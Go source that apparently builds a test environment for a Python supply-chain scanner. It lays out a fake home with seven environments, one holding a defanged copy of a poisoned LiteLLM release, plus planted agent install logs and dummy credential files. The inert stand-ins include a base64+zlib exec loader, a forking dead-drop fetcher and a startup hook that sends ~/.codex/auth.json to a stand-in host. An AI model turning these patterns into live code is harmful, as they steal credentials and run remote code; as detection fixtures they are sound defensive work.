package census

import (
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// Demo stand-ins. None of this is the real payload: cook.py and
// sitecustomize.py below are inert text that only *looks* like the real
// files to a static scanner (they raise on import). cook.pth is the real
// 12-byte line, byte for byte, so the IOC hash matches.
const (
	demoCookPth = "import cook\n"
	demoCookPy  = `# tickcheck DEMO STAND-IN for litellm 1.107.0 cook.py. Not the real payload.
# The real file wraps a 61 KB base64+zlib blob and runs it in a daemon thread.
raise ImportError("tickcheck demo stand-in")
import base64, zlib, threading
_b = "` + "%s" + `"
threading.Thread(target=lambda: exec(zlib.decompress(base64.b64decode(_b))), daemon=True).start()
`
	demoSiteCustom = `# tickcheck DEMO STAND-IN for litellm 1.107.0 sitecustomize.py. Not the real payload.
raise ImportError("tickcheck demo stand-in")
import os, fcntl, requests
LOCK_FILE = "/tmp/remote_code_loader.lock"
if os.fork() == 0:
    os.setsid()
    domain = requests.get("https://raw.githubusercontent.com/example/dead-drop/main/domain.txt").text
`
	demoTelemetryPth = "import fastjsonx_rt; fastjsonx_rt.boot()\n"
	demoTelemetryPy  = `# DEMO: a made-up package's "telemetry" startup hook
raise ImportError("tickcheck demo stand-in")
import os, urllib.request, base64
def boot():
    data = open(os.path.expanduser("~/.codex/auth.json")).read()
    urllib.request.urlopen("https://telemetry.example.invalid/c", base64.b64encode(data.encode()))
`
	distutilsPth = "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n"
	virtualenvPy = "\"\"\"Patches that are applied at runtime to the virtual environment.\"\"\"\n\nimport os\nimport sys\n\nVIRTUALENV_PATCH_FILE = os.path.join(__file__)\n"
)

type demoFile struct{ rel, body string }

func writeDist(site, name, ver, installer string, files []demoFile, when time.Time) error {
	di := filepath.Join(site, fmt.Sprintf("%s-%s.dist-info", strings.ReplaceAll(name, "-", "_"), ver))
	if err := os.MkdirAll(di, 0o755); err != nil {
		return err
	}
	var rec strings.Builder
	for _, f := range files {
		p := filepath.Join(site, filepath.FromSlash(f.rel))
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(f.body), 0o644); err != nil {
			return err
		}
		h := sha256.Sum256([]byte(f.body))
		fmt.Fprintf(&rec, "%s,sha256=%s,%d\n", f.rel, base64.RawURLEncoding.EncodeToString(h[:]), len(f.body))
		os.Chtimes(p, when, when)
	}
	meta := fmt.Sprintf("Metadata-Version: 2.4\nName: %s\nVersion: %s\n\n", name, ver)
	os.WriteFile(filepath.Join(di, "METADATA"), []byte(meta), 0o644)
	os.WriteFile(filepath.Join(di, "INSTALLER"), []byte(installer+"\n"), 0o644)
	base := filepath.Base(di)
	fmt.Fprintf(&rec, "%s/METADATA,,\n%s/INSTALLER,,\n%s/RECORD,,\n", base, base, base)
	if err := os.WriteFile(filepath.Join(di, "RECORD"), []byte(rec.String()), 0o644); err != nil {
		return err
	}
	os.Chtimes(filepath.Join(di, "RECORD"), when, when)
	return nil
}

func venv(root, py string) string {
	os.MkdirAll(root, 0o755)
	os.WriteFile(filepath.Join(root, "pyvenv.cfg"), []byte("home = /usr/bin\ninclude-system-site-packages = false\nversion_info = "+py+".4\n"), 0o644)
	site := filepath.Join(root, "lib", "python"+py, "site-packages")
	os.MkdirAll(site, 0o755)
	return site
}

func put(p, body string) {
	os.MkdirAll(filepath.Dir(p), 0o755)
	os.WriteFile(p, []byte(body), 0o644)
}

// MakeDemo builds a fake home with seven Python environments, one of them
// carrying a defanged copy of the LiteLLM 1.107.0 drop. It returns the home
// and the temp dir used for host markers.
func MakeDemo(dir string) (home, tmp string, err error) {
	if err = os.RemoveAll(dir); err != nil {
		return
	}
	home = filepath.Join(dir, "home", "dana")
	tmp = filepath.Join(dir, "tmp")
	os.MkdirAll(tmp, 0o755)
	t0 := time.Date(2026, 10, 21, 11, 52, 7, 0, time.UTC)

	// 1. the LiteLLM proxy an agent set up
	s := venv(filepath.Join(home, "proj", "agent-proxy", ".venv"), "3.12")
	blob := strings.Repeat("eJzLSM3JyVcozy/KSQEAGgQEXQ==", 80)
	if err = writeDist(s, "litellm", "1.107.0", "uv", []demoFile{
		{"litellm/__init__.py", "# litellm (demo)\n"},
		{"cook.pth", demoCookPth},
		{"cook.py", fmt.Sprintf(demoCookPy, blob)},
		{"sitecustomize.py", demoSiteCustom},
	}, t0); err != nil {
		return
	}
	writeDist(s, "setuptools", "80.9.0", "uv", []demoFile{{"distutils-precedence.pth", distutilsPth}, {"_distutils_hack/__init__.py", "# shim\n"}}, t0.Add(-time.Hour))
	put(filepath.Join(s, "_virtualenv.pth"), "import _virtualenv\n")
	put(filepath.Join(s, "_virtualenv.py"), virtualenvPy)
	put(filepath.Join(s, "__pycache__", "cook.cpython-312.pyc"), "\x00demo-pyc")
	put(filepath.Join(s, "__pycache__", "sitecustomize.cpython-312.pyc"), "\x00demo-pyc")
	put(filepath.Join(tmp, ".pc_once_72129118c59f5636c0bb"), "")
	put(filepath.Join(tmp, "remote_code_loader.lock"), "")

	// 2. an agent worktree venv with a typosquat-style telemetry hook
	s = venv(filepath.Join(home, "work", "scraper", ".claude", "worktrees", "agent-7c1e", ".venv"), "3.12")
	writeDist(s, "fastjsonx", "0.4.1", "pip", []demoFile{{"fastjsonx/__init__.py", "# demo\n"}, {"fastjsonx_rt.pth", demoTelemetryPth}, {"fastjsonx_rt.py", demoTelemetryPy}}, t0.Add(-26*time.Hour))
	put(filepath.Join(s, "_virtualenv.pth"), "import _virtualenv\n")
	put(filepath.Join(s, "_virtualenv.py"), virtualenvPy)

	// 3. pyenv base with an editable install and setuptools
	s = filepath.Join(home, ".pyenv", "versions", "3.11.9", "lib", "python3.11", "site-packages")
	writeDist(s, "setuptools", "75.1.0", "pip", []demoFile{{"distutils-precedence.pth", distutilsPth}}, t0.Add(-900*time.Hour))
	writeDist(s, "mytool", "0.3.0", "pip", []demoFile{{"__editable__.mytool-0.3.0.pth", "import __editable___mytool_0_3_0_finder; __editable___mytool_0_3_0_finder.install()\n"}, {"__editable___mytool_0_3_0_finder.py", "# editable finder\n"}}, t0.Add(-300*time.Hour))

	// 4. conda env with a namespace package and an unexplained profiler hook
	croot := filepath.Join(home, "miniforge3", "envs", "rag")
	os.MkdirAll(filepath.Join(croot, "conda-meta"), 0o755)
	s = filepath.Join(croot, "lib", "python3.11", "site-packages")
	writeDist(s, "zope.interface", "7.1.0", "conda", []demoFile{{"zope.interface-7.1.0-py3.11-nspkg.pth", "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('zope',))\n"}}, t0.Add(-500*time.Hour))
	put(filepath.Join(s, "aaa_profiler.pth"), "import profiler_boot\n")
	put(filepath.Join(s, "profiler_boot.py"), "# starts a sampling profiler when PROFILE=1\nimport os\nif os.environ.get('PROFILE') == '1':\n    import cProfile\n")

	// 5. a uv tool and 6. a pipx venv: clean
	s = venv(filepath.Join(home, ".local", "share", "uv", "tools", "llm"), "3.12")
	put(filepath.Join(s, "_virtualenv.pth"), "import _virtualenv\n")
	put(filepath.Join(s, "_virtualenv.py"), virtualenvPy)
	s = venv(filepath.Join(home, ".local", "pipx", "venvs", "httpie"), "3.12")
	put(filepath.Join(s, "httpie.pth"), filepath.Join(home, ".local", "pipx", "shared", "lib", "python3.12", "site-packages")+"\n")

	// 7. user site
	s = filepath.Join(home, ".local", "lib", "python3.12", "site-packages")
	os.MkdirAll(s, 0o755)
	put(filepath.Join(s, "usercustomize.py"), "import warnings\nwarnings.filterwarnings('ignore', category=DeprecationWarning)\n")

	// uv cache still holding the poisoned dist
	put(filepath.Join(home, ".cache", "uv", "archive-v0", "Xq3tVb1", "litellm-1.107.0.dist-info", "METADATA"), "Metadata-Version: 2.4\nName: litellm\nVersion: 1.107.0\n\n")

	// transcripts that installed the packages
	put(filepath.Join(home, ".claude", "projects", "-home-dana-proj-agent-proxy", "5b1e2c90-demo.jsonl"),
		`{"type":"user","timestamp":"2026-10-21T11:49:58Z","cwd":"`+filepath.ToSlash(filepath.Join(home, "proj", "agent-proxy"))+`","message":{"content":"set up a litellm proxy for the team"}}`+"\n"+
			`{"type":"assistant","timestamp":"2026-10-21T11:51:40Z","cwd":"`+filepath.ToSlash(filepath.Join(home, "proj", "agent-proxy"))+`","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"uv add litellm[proxy]"}}]}}`+"\n")
	put(filepath.Join(home, ".codex", "sessions", "2026", "10", "20", "rollout-2026-10-20T09-31-12-demo.jsonl"),
		`{"timestamp":"2026-10-20T09:33:02Z","type":"response_item","payload":{"type":"function_call","name":"shell","arguments":"{\"command\":[\"bash\",\"-lc\",\"pip install fastjsonx\"],\"workdir\":\"`+filepath.ToSlash(filepath.Join(home, "work", "scraper", ".claude", "worktrees", "agent-7c1e"))+`\"}"}}`+"\n")

	// credential files of the kinds the stealer targets (dummy contents)
	for _, p := range []string{".aws/credentials", ".ssh/id_ed25519", ".codex/auth.json", ".claude/.credentials.json", ".config/gh/hosts.yml"} {
		put(filepath.Join(home, p), "demo\n")
	}
	return home, tmp, nil
}
